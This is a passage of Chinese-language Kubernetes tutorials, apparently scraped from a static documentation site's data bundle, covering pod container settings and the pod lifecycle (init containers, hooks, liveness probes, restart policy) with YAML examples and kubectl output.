explain pod.spec.containers\nkind:     pod\nversion:  v1\nresource: containers <[]object>   # 数组，代表可以有多个容器\nfields:\n   name  <string>     # 容器名称\n   image <string>     # 容器需要的镜像地址\n   imagepullpolicy  <string> # 镜像拉取策略 \n   command  <[]string> # 容器的启动命令列表，如不指定，使用打包时使用的启动命令\n   args     <[]string> # 容器的启动命令需要的参数列表\n   env      <[]object> # 容器环境变量的配置\n   ports    <[]object>     # 容器需要暴露的端口号列表\n   resources <object>      # 资源限制和资源请求的设置\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 基本配置\n\n创建 pod-base.yaml 文件，内容如下：\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-base\n  namespace: dev\n  labels:\n    user: heima\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  - name: busybox\n    image: busybox:1.30\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n上面定义了一个比较简单 pod 的配置，里面有两个容器：\n\n * nginx：用 1.17.1 版本的 nginx 镜像创建，（nginx 是一个轻量级 web 容器）\n * busybox：用 1.30 版本的 busybox 镜像创建，（busybox 是一个小巧的 linux 命令集合）\n\n# 创建pod\n[root@k8s-master01 pod]# kubectl apply -f pod-base.yaml\npod/pod-base created\n\n# 查看pod状况\n# ready 1/2 : 表示当前pod中有2个容器，其中1个准备就绪，1个未就绪\n# restarts  : 重启次数，因为有1个容器故障了，pod一直在重启试图恢复它\n[root@k8s-master01 pod]# kubectl get pod -n dev\nname       ready   status    restarts   age\npod-base   1/2     running   4          95s\n\n# 可以通过describe查看内部的详情\n# 此时已经运行起来了一个基本的pod，所以它暂时有问题\n[root@k8s-master01 pod]# kubectl describe pod pod-base -n dev\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 镜像拉取\n\n当我们的 pod 已经拉取镜像并启动容器，其他 pod 也需要此镜像，那么此时其他 pod 拉取相同镜像是从镜像源拉取，还是直接使用已经拉取过的镜像？这就由 imagepullpolicy 来决定。\n\n创建 pod-imagepullpolicy.yaml 文件，内容如下：\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-imagepullpolicy\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    imagepullpolicy: never # 用于设置镜像拉取策略\n  - name: busybox\n    image: busybox:1.30\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nimagepullpolicy，用于设置镜像拉取策略，kubernetes 支持配置三种拉取策略：\n\n * always：总是从远程仓库拉取镜像（一直远程下载）\n * ifnotpresent：本地有则使用本地镜像，本地没有则从远程仓库拉取镜像（本地有就本地 本地没远程下载）\n * never：只使用本地镜像，从不去远程仓库拉取，本地没有就报错 （一直使用本地）\n\n> 默认值说明:\n> 如果镜像 tag 为具体版本号， 默认策略是：ifnotpresent\n> 如果镜像 tag 为：latest（最终版本） ，默认策略是 always\n\n# 创建pod\n[root@k8s-master01 pod]# kubectl create -f pod-imagepullpolicy.yaml\npod/pod-imagepullpolicy created\n\n# 查看pod详情\n# 此时明显可以看到nginx镜像有一步pulling image "nginx:1.17.1"的过程\n[root@k8s-master01 pod]# kubectl describe pod pod-imagepullpolicy -n dev\n......\nevents:\n  type     reason     age               from               message\n  ----     ------     ----              ----               -------\n  normal   scheduled  <unknown>         default-scheduler  successfully assigned dev/pod-imagepullpolicy to node1\n  normal   pulling    32s               kubelet, node1     pulling image "nginx:1.17.1"\n  normal   pulled     26s               kubelet, node1     successfully pulled image "nginx:1.17.1"\n  normal   created    26s               kubelet, node1     created container nginx\n  normal   started    25s               kubelet, node1     started container nginx\n  normal   pulled     7s (x3 over 25s)  kubelet, node1     container image "busybox:1.30" already present on machine\n  normal   created    7s (x3 over 25s)  kubelet, node1     created container busybox\n  normal   started    7s (x3 over 25s)  kubelet, node1     started container busybox\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 启动命令\n\n在 基本配置 的案例中，有一个问题没有解决，就是 busybox 容器一直没有成功运行，那么到底是什么原因导致这个容器的故障呢？\n\nbusybox 并不是一个程序，而是类似于一个工具类的集合，kubernetes 集群启动管理后，它会自动关闭。解决方法就是让其一直在运行，这就用到了 command 配置。\n\n创建 pod-command.yaml 文件，内容如下：\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-command\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  - name: busybox\n    image: busybox:1.30\n    # 容器启动成功，执行死循环\n    command: ["/bin/sh","-c","touch /tmp/hello.txt;while true;do /bin/echo $(date +%t) >> /tmp/hello.txt; sleep 3; done;"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\ncommand，用于在 pod 中的容器初始化完毕之后运行一个命令。\n\n> 稍微解释下上面命令的意思：\n> "/bin/sh","-c", 使用 sh 执行命令\n> touch /tmp/hello.txt; 创建一个 /tmp/hello.txt 文件\n> while true;do /bin/echo $(date +% t) >> /tmp/hello.txt; sleep 3; done; 每隔 3 秒向文件中写入当前时间\n\n# 创建pod\n[root@k8s-master01 pod]# kubectl create  -f pod-command.yaml\npod/pod-command created\n\n# 查看pod状态\n# 此时发现两个pod都正常运行了\n[root@k8s-master01 pod]# kubectl get pods pod-command -n dev\nname          ready   status   restarts   age\npod-command   2/2     runing   0          2s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n进入 pod 中的 busybox 容器，查看文件内容，命令如下\n\nkubectl exec  pod名称 -n 命名空间 -it -c 容器名称 /bin/sh\n\n\n1\n\n\n使用这个命令就可以进入某个容器的内部，然后进行相关操作了，比如，可以查看 txt 文件的内容。演示：\n\n[root@k8s-master01 pod]# kubectl exec pod-command -n dev -it -c busybox /bin/sh\n/ # tail -f /tmp/hello.txt\n14:44:19\n14:44:22\n14:44:25\n\n\n1\n2\n3\n4\n5\n\n\n> 特别说明：\n> 通过上面发现 command 已经可以完成启动命令和传递参数的功能，为什么这里还要提供一个 args 选项，用于传递参数呢？这其实跟 docker 有点关系，kubernetes 中的 command、args 两项其实是实现覆盖 dockerfile 中 entrypoint 的功能。\n> 1 如果 command 和 args 均没有写，那么用 dockerfile 的配置。\n> 2 如果 command 写了，但 args 没有写，那么 dockerfile 默认的配置会被忽略，执行输入的 command\n> 3 如果 command 没写，但 args 写了，那么 dockerfile 中配置的 entrypoint 的命令会被执行，使用当前 args 的参数\n> 4 如果 command 和 args 都写了，那么 dockerfile 的配置被忽略，执行 command 并追加上 args 参数\n\n\n# 环境变量\n\n创建 pod-env.yaml 文件，内容如下：\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-env\n  namespace: dev\nspec:\n  containers:\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","while true;do /bin/echo $(date +%t);sleep 60; done;"]\n    env: # 设置环境变量列表\n    - name: "username"\n      value: "admin"\n    - name: "password"\n      value: "123456"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nenv，环境变量，用于在 pod 中的容器设置环境变量。\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-env.yaml\npod/pod-env created\n\n# 进入容器，输出环境变量\n[root@k8s-master01 ~]# kubectl exec pod-env -n dev -c busybox -it /bin/sh\n/ # echo $username\nadmin\n/ # echo $password\n123456\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n这种方式不是很推荐，推荐将这些配置单独存储在配置文件中，这种方式将在后面介绍。\n\n\n# 端口设置\n\n本小节来介绍容器的端口设置，也就是 containers 的 ports 选项。\n\n首先看下 ports 支持的子选项：\n\n[root@k8s-master01 ~]# kubectl explain pod.spec.containers.ports\nkind:     pod\nversion:  v1\nresource: ports <[]object>\nfields:\n   name         <string>  # 端口名称，如果指定，必须保证name在pod中是唯一的\t\t\n   containerport<integer> # 容器要监听的端口(0<x<65536)\n   hostport     <integer> # 容器要在主机上公开的端口，如果设置，主机上只能运行容器的一个副本(一般省略) \n   hostip       <string>  # 要将外部端口绑定到的主机ip(一般省略)\n   protocol     <string>  # 端口协议。必须是udp、tcp或sctp。默认为“tcp”。\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n接下来，编写一个测试案例，创建 pod-ports.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-ports\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports: # 设置容器暴露的端口列表\n    - name: nginx-port\n      containerport: 80\n      protocol: tcp\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-ports.yaml\npod/pod-ports created\n\n# 查看pod\n# 在下面可以明显看到配置信息\n[root@k8s-master01 ~]# kubectl get pod pod-ports -n dev -o yaml\n......\nspec:\n  containers:\n  - image: nginx:1.17.1\n    imagepullpolicy: ifnotpresent\n    name: nginx\n    ports:\n    - containerport: 80\n      name: nginx-port\n      protocol: tcp\n......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n访问容器中的程序需要使用的是 podip:containerport\n\n\n# 资源配额\n\n容器中的程序要运行，肯定是要占用一定资源的，比如 cpu 和内存等，如果不对某个容器的资源做限制，那么它就可能吃掉大量资源，导致其它容器无法运行。针对这种情况，kubernetes 提供了对内存和 cpu 的资源进行配额的机制，这种机制主要通过 resources 选项实现，他有两个子选项：\n\n * limits：用于限制运行时容器的最大占用资源，当容器占用资源超过 limits 时会被终止，并进行重启\n * requests ：用于设置容器需要的最小资源，如果环境资源不够，容器将无法启动\n\n可以通过上面两个选项设置资源的上下限。当配置了后，会自动去找合适的主机资源来启动 pod\n\n接下来，编写一个测试案例，创建 pod-resources.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-resources\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    resources: # 资源配额\n      limits:  # 限制资源（上限）\n        cpu: "2" # cpu限制，单位是core数\n        memory: "10gi" # 内存限制\n      requests: # 请求资源（下限）\n        cpu: "1"  # cpu限制，单位是core数\n        memory: "10mi"  # 内存限制\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n在这对 cpu 和 memory 的单位做一个说明：\n\n * cpu：core 数，可以为整数或小数\n * memory： 内存大小，可以使用 gi、mi、g、m 等形式\n\n# 运行pod\n[root@k8s-master01 ~]# kubectl create  -f pod-resources.yaml\npod/pod-resources created\n\n# 查看发现pod运行正常\n[root@k8s-master01 ~]# kubectl get pod pod-resources -n dev\nname            ready   status    restarts   age  \npod-resources   1/1     running   0          39s   \n\n# 接下来，停止pod\n[root@k8s-master01 ~]# kubectl delete  -f pod-resources.yaml\npod "pod-resources" deleted\n\n# 编辑pod，修改resources.requests.memory的值为10gi\n[root@k8s-master01 ~]# vim pod-resources.yaml\n\n# 再次启动pod\n[root@k8s-master01 ~]# kubectl create  -f pod-resources.yaml\npod/pod-resources created\n\n# 查看pod状态，发现pod启动失败\n[root@k8s-master01 ~]# kubectl get pod pod-resources -n dev -o wide\nname            ready   status    restarts   age          \npod-resources   0/1     pending   0          20s    \n\n# 查看pod详情会发现，如下提示\n[root@k8s-master01 ~]# kubectl describe pod pod-resources -n dev\n......\nwarning  failedscheduling  35s   default-scheduler  0/3 nodes are available: 1 node(s) had taint {node-role.kubernetes.io/master: }, that the pod didn\'t tolerate, 2 insufficient memory.(内存不足)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n',charsets:{cjk:!0}},{title:"kubernetes(六) Pod 生命周期",frontmatter:{title:"kubernetes(六) Pod 生命周期",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/605",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/60.Kubernetes/605.kubernetes(%E5%85%AD)%20Pod%20%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.html",relativePath:"01.运维/60.Kubernetes/605.kubernetes(六) Pod 生命周期.md",key:"v-22acaa33",path:"/kubernetes/605/",headers:[{level:2,title:"概述",slug:"概述",normalizedTitle:"概述",charIndex:2},{level:2,title:"钩子函数",slug:"钩子函数",normalizedTitle:"钩子函数",charIndex:3842},{level:2,title:"容器探测",slug:"容器探测",normalizedTitle:"容器探测",charIndex:5547},{level:2,title:"重启策略",slug:"重启策略",normalizedTitle:"重启策略",charIndex:7477}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"概述 钩子函数 容器探测 重启策略",content:'# 概述\n\n我们一般将 Pod 对象从创建至终的这段时间范围称为 Pod 的生命周期，它主要包含下面的过程：\n\n * Pod 创建过程\n * 运行初始化容器（init container）过程\n * 运行主容器（main container）过程\n   * 容器启动后钩子（post start）、容器终止前钩子（pre stop）\n     - 容器的存活性探测（liveness probe）、就绪性探测（readiness probe）\n * pod 终止过程\n\n\n\n在整个生命周期中，Pod 会出现 5 中状态，分别如下：\n\n * 挂起（Pending）：apiserver 已经创建了 pod 资源对象，但它尚未被调度完成或者仍处于下载镜像的过程中\n * 运行中（Running）：pod 已经被调度至某节点，并且所有容器都已经被 kubelet 创建完成\n * 成功（Successded）：pod 中的所有容器都已经成功终止并且不会被重启\n * 失败（Failed）：所有容器都已经终止，但至少有一个容器终止失败，即容器返回了非 0 值得退出状态\n * 未知（Unknown）：apiserver 无法正常获取到 pod 对象的状态信息，通常由网络通信失败所导致\n\n\n# 创建和终止\n\npod 的创建过程\n\n 1. 用户通过 kubectl 或其他 api 客户端提交需要创建的 pod 信息给 apiServer\n 2. apiServer 开始生成 pod 对象的信息，并将信息存入 etcd，然后返回确认信息至客户端\n 3. apiServer 开始反映 etcd 中的 pod 对象的变化，其它组件使用 watch 机制来跟踪检查 apiServer 上的变动\n 4. scheduler 发现有新的 pod 对象要创建，开始为 Pod 分配主机并将结果信息更新至 apiServer\n 5. node 节点上的 kubelet 发现有 pod 调度过来，尝试调用 docker 启动容器，并将结果回送至 apiServer\n 6. apiServer 将接收到的 pod 状态信息存入 etcd 中\n\n\n\npod 的终止过程\n\n 1. 用户向 apiServer 发送删除 pod 对象的命令\n 2. apiServcer 中的 pod 对象信息会随着时间的推移而更新，在宽限期内（默认 30s），pod 被视为 dead\n 3. 将 pod 标记为 terminating 状态\n 4. kubelet 在监控到 pod 对象转为 terminating 状态的同时启动 pod 关闭过程\n 5. 端点控制器监控到 pod 对象的关闭行为时将其从所有匹配到此端点的 service 资源的端点列表中移除\n 6. 如果当前 pod 对象定义了 preStop 钩子处理器，则在其标记为 terminating 后即会以同步的方式启动执行\n 7. pod 对象中的容器进程收到停止信号\n 8. 宽限期结束后，若 pod 中还存在仍在运行的进程，那么 pod 对象会收到立即终止的信号\n 9. kubelet 请求 apiServer 将此 pod 资源的宽限期设置为 0 从而完成删除操作，此时 pod 对于用户已不可见\n\n\n# 初始化和容器\n\n初始化容器是在 pod 的主容器启动之前要运行的容器，主要是做一些主容器的前置工作，它具有两大特征：\n\n 1. 初始化容器必须运行完成直至结束，若某初始化容器运行失败，那么 kubernetes 需要重启它直到成功完成\n 2. 初始化容器必须按照定义的顺序执行，当且仅当前一个成功之后，后面的一个才能运行\n\n初始化容器有很多的应用场景，下面列出的是最常见的几个：\n\n * 提供主容器镜像中不具备的工具程序或自定义代码\n * 初始化容器要先于应用容器串行启动并运行完成，因此可用于延后应用容器的启动直至其依赖的条件得到满足\n\n假设要以主容器来运行 nginx，但是要求在运行 nginx 之前先要能够连接上相应的服务器是可以 ping 通的。\n创建 pod-initcontainer.yaml，内容如下：\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-initcontainer\n  namespace: dev\nspec:\n  containers:\n  - name: main-container\n    image: nginx:1.17.1\n    ports: \n    - name: nginx-port\n      containerPort: 80\n  # 初始化容器\n  initContainers:\n  # 模拟mysql连接\n  - name: test-mysql\n    image: busybox:1.30\n    command: [\'sh\', \'-c\', \'until ping 192.168.81.102 -c 1 ; do echo waiting for mysql...; sleep 2; done;\']、\n  # 模拟redis连接\n  - name: test-redis\n    image: busybox:1.30\n    command: [\'sh\', \'-c\', \'until ping 192.168.81.103 -c 1 ; do echo waiting for reids...; sleep 2; done;\']\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-initcontainer.yaml\npod/pod-initcontainer created\n\n# 查看pod状态\n# 发现pod卡在启动第一个初始化容器过程中，后面的容器不会运行\nroot@k8s-master01 ~]# kubectl describe pod  pod-initcontainer -n dev\n........\nEvents:\n  Type    Reason     Age   From               Message\n  ----    ------     ----  ----               -------\n  Normal  Scheduled  49s   default-scheduler  Successfully assigned dev/pod-initcontainer to node1\n  Normal  Pulled     48s   kubelet, node1     Container image "busybox:1.30" already present on machine\n  Normal  Created    48s   kubelet, node1     Created container test-mysql\n  Normal  Started    48s   kubelet, node1     Started container test-mysql\n\n# 动态查看pod\n[root@k8s-master01 ~]# kubectl get pods pod-initcontainer -n dev -w\nNAME                             READY   STATUS     RESTARTS   AGE\npod-initcontainer                0/1     Init:0/2   0          15s\npod-initcontainer                0/1     Init:1/2   0          52s\npod-initcontainer                0/1     Init:1/2   0          53s\npod-initcontainer                0/1     PodInitializing   0          89s\npod-initcontainer                1/1     Running           0          90s\n\n# 接下来新开一个shell，为当前服务器新增两个ip，观察pod的变化，为网卡添加地址\n[root@k8s-master01 ~]# ifconfig ens33:1 192.168.81.102 netmask 255.255.255.0 up\n[root@k8s-master01 ~]# ifconfig ens33:2 192.168.81.103 netmask 255.255.255.0 up\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# 钩子函数\n\n钩子函数能够感知自身生命周期中的事件，并在相应的时刻到来时运行用户指定的程序代码。\n\nkubernetes 在主容器的启动之后和停止之前提供了两个钩子函数：\n\n * post start：容器创建之后执行，如果失败了会重启容器\n * pre stop ：容器终止之前执行，执行完成之后容器将成功终止，在其完成之前会阻塞删除容器的操作\n\n钩子处理器支持使用下面三种方式定义动作：\n\n * Exec 命令：在容器内执行一次命令\n\n……\n  lifecycle:\n    postStart: \n      exec:\n        command:\n        - cat\n        - /tmp/healthy\n……\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n * TCPSocket：在当前容器尝试访问指定的 socket\n\n……      \n  lifecycle:\n    postStart:\n      tcpSocket:\n        port: 8080\n……\n\n\n1\n2\n3\n4\n5\n6\n\n * HTTPGet：在当前容器中向某 url 发起 http 请求\n\n……\n  lifecycle:\n    postStart:\n      httpGet:\n        path: / #URI地址\n        port: 80 #端口号\n        host: 192.168.5.3 #主机地址\n        scheme: HTTP #支持的协议，http或者https\n……\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n接下来，以 exec 方式为例，演示下钩子函数的使用，创建 pod-hook-exec.yaml 文件，内容如下：\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-hook-exec\n  namespace: dev\nspec:\n  containers:\n  - name: main-container\n    image: nginx:1.17.1\n    ports:\n    - name: nginx-port\n      containerPort: 80\n    # 生命周期\n    lifecycle:\n      postStart: \n        exec: # 在容器启动的时候执行一个命令，修改掉nginx的默认首页内容\n          command: ["/bin/sh", "-c", "echo postStart... > /usr/share/nginx/html/index.html"]\n      preStop:\n        exec: # 在容器停止之前停止nginx服务\n          command: ["/usr/sbin/nginx","-s","quit"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-hook-exec.yaml\npod/pod-hook-exec created\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods  pod-hook-exec -n dev -o wide\nNAME           READY   STATUS     RESTARTS   AGE    IP            NODE    \npod-hook-exec  1/1     Running    0          29s    10.244.2.48   node2   \n\n# 访问pod\n[root@k8s-master01 ~]# curl 10.244.2.48\npostStart...\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 容器探测\n\n容器探测用于检测容器中的应用实例是否正常工作，是保障业务可用性的一种传统机制。如果经过探测，实例的状态不符合预期，那么 kubernetes 就会把该问题实例 "摘除"，不承担业务流量。kubernetes 提供了两种探针来实现容器探测，分别是：\n\n * liveness probes：存活性探针，用于检测应用实例当前是否处于正常运行状态，如果不是，k8s 会重启容器\n * readiness probes：就绪性探针，用于检测应用实例当前是否可以接收请求，如果不能，k8s 不会转发流量\n\n> livenessProbe 决定是否重启容器，readinessProbe 决定是否将请求转发给容器。\n\n上面两种探针目前均支持三种探测方式：\n\n * Exec 命令：在容器内执行一次命令，如果命令执行的退出码为 0，则认为程序正常，否则不正常\n\n……\n  livenessProbe:\n    exec:\n      command:\n      - cat\n      - /tmp/healthy\n……\n\n\n1\n2\n3\n4\n5\n6\n7\n\n * TCPSocket：将会尝试访问一个用户容器的端口，如果能够建立这条连接，则认为程序正常，否则不正常\n\n……      \n  livenessProbe:\n    tcpSocket:\n      port: 8080\n……\n\n\n1\n2\n3\n4\n5\n\n * HTTPGet：调用容器内 Web 应用的 URL，如果返回的状态码在 200 和 399 之间，则认为程序正常，否则不正常\n\n……\n  livenessProbe:\n    httpGet:\n      path: / #URI地址\n      port: 80 #端口号\n      host: 127.0.0.1 #主机地址\n      scheme: HTTP #支持的协议，http或者https\n……\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n下面以 liveness probes 为例，做几个演示：\n方式一：Exec\n创建 pod-liveness-exec.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-liveness-exec\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports: \n    - name: nginx-port\n      containerPort: 80\n    livenessProbe:\n      exec:\n        command: ["/bin/cat","/tmp/hello.txt"] # 执行一个查看文件的命令\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n创建 pod，观察效果\n\n# 创建Pod\n[root@k8s-master01 ~]# kubectl create -f pod-liveness-exec.yaml\npod/pod-liveness-exec created\n\n# 查看Pod详情\n[root@k8s-master01 ~]# kubectl describe pods pod-liveness-exec -n dev\n......\n  Normal   Created    20s (x2 over 50s)  kubelet, node1     Created container nginx\n  Normal   Started    20s (x2 over 50s)  kubelet, node1     Started container nginx\n  Normal   Killing    20s                kubelet, node1     Container nginx failed liveness probe, will be restarted\n  Warning  Unhealthy  0s (x5 over 40s)   kubelet, node1     Liveness probe failed: cat: can\'t open \'/tmp/hello11.txt\': No such file or directory\n  \n# 观察上面的信息就会发现nginx容器启动之后就进行了健康检查\n# 检查失败之后，容器被kill掉，然后尝试进行重启（这是重启策略的作用，后面讲解）\n# 稍等一会之后，再观察pod信息，就可以看到RESTARTS不再是0，而是一直增长\n[root@k8s-master01 ~]# kubectl get pods pod-liveness-exec -n dev\nNAME                READY   STATUS             RESTARTS   AGE\npod-liveness-exec   0/1     CrashLoopBackOff   2          3m19s\n\n# 当然接下来，可以修改成一个存在的文件，比如/tmp/hello.txt，再试，结果就正常了......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n方式二：TCPSocket\n创建 pod-liveness-tcpsocket.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-liveness-tcpsocket\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports: \n    - name: nginx-port\n      containerPort: 80\n    livenessProbe:\n      tcpSocket:\n        port: 8080 # 尝试访问8080端口\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n创建 pod，观察效果\n\n# 创建Pod\n[root@k8s-master01 ~]# kubectl create -f pod-liveness-tcpsocket.yaml\npod/pod-liveness-tcpsocket created\n\n# 查看Pod详情\n[root@k8s-master01 ~]# kubectl describe pods pod-liveness-tcpsocket -n dev\n......\n  Normal   Scheduled  31s                            default-scheduler  Successfully assigned dev/pod-liveness-tcpsocket to node2\n  Normal   Pulled     <invalid>                      kubelet, node2     Container image "nginx:1.17.1" already present on machine\n  Normal   Created    <invalid>                      kubelet, node2     Created container nginx\n  Normal   Started    <invalid>                      kubelet, node2     Started container nginx\n  Warning  Unhealthy  <invalid> (x2 over <invalid>)  kubelet, node2     Liveness probe failed: dial tcp 10.244.2.44:8080: connect: connection refused\n  \n# 观察上面的信息，发现尝试访问8080端口,但是失败了\n# 稍等一会之后，再观察pod信息，就可以看到RESTARTS不再是0，而是一直增长\n[root@k8s-master01 ~]# kubectl get pods pod-liveness-tcpsocket  -n dev\nNAME                     READY   STATUS             RESTARTS   AGE\npod-liveness-tcpsocket   0/1     CrashLoopBackOff   2          3m19s\n\n# 当然接下来，可以修改成一个可以访问的端口，比如80，再试，结果就正常了......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n方式三：HTTPGet\n创建 pod-liveness-httpget.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-liveness-httpget\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - name: nginx-port\n      containerPort: 80\n    livenessProbe:\n      httpGet:  # 其实就是访问http://127.0.0.1:80/hello  \n        scheme: HTTP #支持的协议，http或者https\n        port: 80 #端口号\n        path: /hello #URI地址\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n创建 pod，观察效果\n\n# 创建Pod\n[root@k8s-master01 ~]# kubectl create -f pod-liveness-httpget.yaml\npod/pod-liveness-httpget created\n\n# 查看Pod详情\n[root@k8s-master01 ~]# kubectl describe pod pod-liveness-httpget -n dev\n.......\n  Normal   Pulled     6s (x3 over 64s)  kubelet, node1     Container image "nginx:1.17.1" already present on machine\n  Normal   Created    6s (x3 over 64s)  kubelet, node1     Created container nginx\n  Normal   Started    6s (x3 over 63s)  kubelet, node1     Started container nginx\n  Warning  Unhealthy  6s (x6 over 56s)  kubelet, node1     Liveness probe failed: HTTP probe failed with statuscode: 404\n  Normal   Killing    6s (x2 over 36s)  kubelet, node1     Container nginx failed liveness probe, will be restarted\n  \n# 观察上面信息，尝试访问路径，但是未找到,出现404错误\n# 稍等一会之后，再观察pod信息，就可以看到RESTARTS不再是0，而是一直增长\n[root@k8s-master01 ~]# kubectl get pod pod-liveness-httpget -n dev\nNAME                   READY   STATUS    RESTARTS   AGE\npod-liveness-httpget   1/1     Running   5          3m17s\n\n# 当然接下来，可以修改成一个可以访问的路径path，比如/，再试，结果就正常了......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n至此，已经使用 liveness Probe 演示了三种探测方式，但是查看 livenessProbe 的子属性，会发现除了这三种方式，还有一些其他的配置，在这里一并解释下：\n\n[root@k8s-master01 ~]# kubectl explain pod.spec.containers.livenessProbe\nFIELDS:\n   exec <Object>  \n   tcpSocket    <Object>\n   httpGet      <Object>\n   initialDelaySeconds  <integer>  # 容器启动后等待多少秒执行第一次探测\n   timeoutSeconds       <integer>  # 探测超时时间。默认1秒，最小1秒\n   periodSeconds        <integer>  # 执行探测的频率。默认是10秒，最小1秒\n   failureThreshold     <integer>  # 连续探测失败多少次才被认定为失败。默认是3。最小值是1\n   successThreshold     <integer>  # 连续探测成功多少次才被认定为成功。默认是1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n * initialDelaySeconds 容器启动后等待多少秒执行第一次探测\n * timeoutSeconds 探测超时时间。默认 1 秒，最小 1 秒\n * periodSeconds 执行探测的频率。默认是 10 秒，最小 1 秒\n * failureThreshold 连续探测失败多少次才被认定为失败。默认是 3。最小值是 1\n * successThreshold 连续探测成功多少次才被认定为成功。默认是 1\n\n下面稍微配置两个，演示下效果即可：\n\n[root@k8s-master01 ~]# more pod-liveness-httpget.yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-liveness-httpget\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - name: nginx-port\n      containerPort: 80\n    livenessProbe:\n      httpGet:\n        scheme: HTTP\n        port: 80 \n        path: /\n      initialDelaySeconds: 30 # 容器启动后30s开始探测\n      timeoutSeconds: 5 # 探测超时时间为5s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 重启策略\n\n一旦容器探测出现了问题，kubernetes 就会对容器所在的 Pod 进行重启，其实这是由 pod 的重启策略决定的，pod 的重启策略有 3 种，分别如下：\n\n * Always ：容器失效时，自动重启该容器，这也是默认值。\n * OnFailure ： 容器终止运行且退出码不为 0 时重启\n * Never ： 不论状态为何，都不重启该容器\n\n重启策略适用于 pod 对象中的所有容器，首次需要重启的容器，将在其需要时立即进行重启，随后再次需要重启的操作将由 kubelet 延迟一段时间后进行，且反复的重启操作的延迟时长以此为 